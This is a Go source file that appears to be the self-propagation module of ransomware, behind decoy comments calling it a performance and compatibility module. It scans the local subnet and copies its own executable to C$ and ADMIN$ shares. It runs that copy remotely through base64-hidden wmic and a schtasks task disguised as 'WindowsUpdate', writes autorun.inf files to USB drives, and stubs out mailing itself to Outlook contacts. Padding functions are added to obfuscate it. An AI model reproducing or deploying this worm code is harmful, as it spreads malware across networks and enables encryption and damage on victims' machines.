// OBFUSCATED
// Performance enhancement module
// Windows compatibility layer
package spreading

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

// NetworkHost represents a discovered network host
type NetworkHost struct {
	IP       string
	Hostname string
	IsActive bool
}

// DiscoverNetworkHosts scans the local network for active hosts
func DiscoverNetworkHosts() []NetworkHost {
	var hosts []NetworkHost

	// Get local IP to determine subnet
	localIP := getLocalIP()
	if localIP == "" {
		return hosts
	}

	// Parse subnet (e.g., 192.168.1.0/24)
	subnet := getSubnet(localIP)

	// Scan subnet for active hosts
	for i := 1; i < 255; i++ {
		ip := fmt.Sprintf("%s.%d", subnet, i)

		// Quick ping check
		if isHostAlive(ip) {
			hostname := resolveHostname(ip)
			hosts = append(hosts, NetworkHost{
				IP:       ip,
				Hostname: hostname,
				IsActive: true,
			})
		}
	}

	return hosts
}

// SpreadToNetwork attempts to spread to discovered hosts
func SpreadToNetwork() {
	// Discover network hosts
	hosts := DiscoverNetworkHosts()

	if len(hosts) == 0 {
		return
	}

	// Get current executable path
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Attempt to spread to each host
	for _, host := range hosts {
		go func(h NetworkHost) {
			// Try multiple spreading methods
			spreadViaSMB(h.IP, exePath)
			spreadViaWMI(h.IP, exePath)
			spreadViaAdmin(h.IP, exePath)
		}(host)
	}
}

// spreadViaSMB copies file to network share
func spreadViaSMB(ip, exePath string) error {
	// Common share paths
	shares := []string{
		fmt.Sprintf("\\\\%s\\C$", ip),
		fmt.Sprintf("\\\\%s\\ADMIN$", ip),
		fmt.Sprintf("\\\\%s\\IPC$", ip),
	}

	// Try each share
	for _, share := range shares {
		destPath := filepath.Join(share, "Windows", "Temp", "svc.exe")

		// Copy file
		if copyFile(exePath, destPath) == nil {
			// Execute on remote system
			executeRemote(ip, destPath)
			return nil
		}
	}

	return fmt.Errorf("failed to spread via SMB")
}

// spreadViaWMI uses WMI to execute on remote system
func spreadViaWMI(ip, exePath string) error {
	// Copy file first
	share := fmt.Sprintf("\\\\%s\\C$\\Windows\\Temp", ip)
	destPath := filepath.Join(share, "svc.exe")

	if copyFile(exePath, destPath) != nil {
		return fmt.Errorf("copy failed")
	}

	// Execute via WMI
	cmd := d("d21pYw==") // wmic
	args := []string{
		"/node:" + ip,
		"process",
		"call",
		"create",
		"C:\\Windows\\Temp\\svc.exe",
	}

	exec.Command(cmd, args...).Run()
	return nil
}

// spreadViaAdmin uses admin shares and scheduled tasks
func spreadViaAdmin(ip, exePath string) error {
	// Copy to admin share
	destPath := fmt.Sprintf("\\\\%s\\C$\\Windows\\Temp\\update.exe", ip)

	if copyFile(exePath, destPath) != nil {
		return fmt.Errorf("copy failed")
	}

	// Create scheduled task on remote system
	taskName := "WindowsUpdate"
	cmd := d("c2NodGFza3M=") // schtasks
	args := []string{
		"/create",
		"/s", ip,
		"/tn", taskName,
		"/tr", "C:\\Windows\\Temp\\update.exe",
		"/sc", "once",
		"/st", time.Now().Add(1 * time.Minute).Format("15:04"),
		"/f",
	}

	exec.Command(cmd, args...).Run()
	return nil
}

// SpreadViaUSB copies to removable drives
func SpreadViaUSB() {
	// Get current executable
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Check all drives
	letters := d("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=")

	for _, drive := range letters {
		drivePath := string(drive) + d("Olxc")

		// Check if it's a removable drive
		if isRemovableDrive(drivePath) {
			// Copy to USB with autorun
			createAutorun(drivePath, exePath)
			copyToUSB(drivePath, exePath)
		}
	}
}

// SpreadViaEmail sends executable via Outlook (if available)
func SpreadViaEmail() {
	// Get current executable
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Check if Outlook is installed
	if !isOutlookInstalled() {
		return
	}

	// Get Outlook contacts
	contacts := getOutlookContacts()

	// Send to first 10 contacts
	limit := 10
	if len(contacts) < limit {
		limit = len(contacts)
	}

	for i := 0; i < limit; i++ {
		sendOutlookEmail(contacts[i], exePath)
	}
}

// Helper functions

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func getSubnet(ip string) string {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return ""
	}
	return strings.Join(parts[:3], ".")
}

func isHostAlive(ip string) bool {
	timeout := 100 * time.Millisecond
	conn, err := net.DialTimeout("tcp", ip+":445", timeout) // SMB port
	if err != nil {
		conn, err = net.DialTimeout("tcp", ip+":135", timeout) // RPC port
		if err != nil {
			return false
		}
	}
	conn.Close()
	return true
}

func resolveHostname(ip string) string {
	names, err := net.LookupAddr(ip)
	if err != nil || len(names) == 0 {
		return ip
	}
	return names[0]
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

func executeRemote(ip, path string) error {
	// Execute via PsExec-like functionality
	cmd := d("d21pYw==")
	args := []string{
		"/node:" + ip,
		"process",
		"call",
		"create",
		path,
	}
	return exec.Command(cmd, args...).Run()
}

func isRemovableDrive(drive string) bool {
	cmd := d("d21pYw==")
	args := []string{
		"logicaldisk",
		"where",
		fmt.Sprintf("DeviceID='%s'", strings.TrimSuffix(drive, "\\")),
		"get",
		"DriveType",
	}

	output, err := exec.Command(cmd, args...).Output()
	if err != nil {
		return false
	}

	// DriveType 2 = Removable
	return strings.Contains(string(output), "2")
}

func createAutorun(drive, exePath string) {
	autorunContent := fmt.Sprintf(`[autorun]
open=%s
action=Open folder to view files
label=USB Drive
icon=%%SystemRoot%%\\system32\\SHELL32.dll,4
`, filepath.Base(exePath))

	os.WriteFile(filepath.Join(drive, "autorun.inf"), []byte(autorunContent), 0644)
}

func copyToUSB(drive, exePath string) {
	dest := filepath.Join(drive, filepath.Base(exePath))
	copyFile(exePath, dest)
}

func isOutlookInstalled() bool {
	// Check if Outlook is installed
	_, err := os.Stat("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE")
	if err == nil {
		return true
	}
	_, err = os.Stat("C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE")
	return err == nil
}

func getOutlookContacts() []string {
	// This is a simplified version
	// Real implementation would use COM/OLE to access Outlook
	return []string{}
}

func sendOutlookEmail(contact, attachment string) error {
	// This would use COM/OLE automation to send email via Outlook
	// Simplified placeholder
	return nil
}

// StartSpreading initiates all spreading mechanisms
func StartSpreading() {
	go func() {
		// Delay to not interfere with encryption
		time.Sleep(30 * time.Second)

		// Try all spreading methods in parallel
		go SpreadToNetwork()
		go SpreadViaUSB()
		go SpreadViaEmail()
	}()
}



// Obfuscation padding
func obf_66826() {
    _ = 3456
    var _ = "2pv14LkAwFsHxZZ3f7CcXvOTf4Ny2oWDiqXBFBgMFZOfwhlEYh"
}


// Obfuscation padding
func obf_68544() {
    _ = 2758
    var _ = "OLPNKsnTNGFNr7OKCCN6j6o7zgjjQw3z7tQvnBS1vljeEEWpD7"
}


// Obfuscation padding
func obf_83054() {
    _ = 5225
    var _ = "meO8BndzAHfjon2PA999XSXexJwv2EP9KapGPHSCbWY9g0cLIu"
}


// Obfuscation padding
func obf_14099() {
    _ = 5584
    var _ = "B4LgbmV7w2UNHzWUb9RJz0G15nmdQo8Lx9ptVr601IRDYhi95c"
}


// Obfuscation padding
func obf_15889() {
    _ = 9590
    var _ = "0AyBcllDxRSD1kqBHQQMEhle9UnbP83H6MzldNlhRNGZyrj4yB"
}
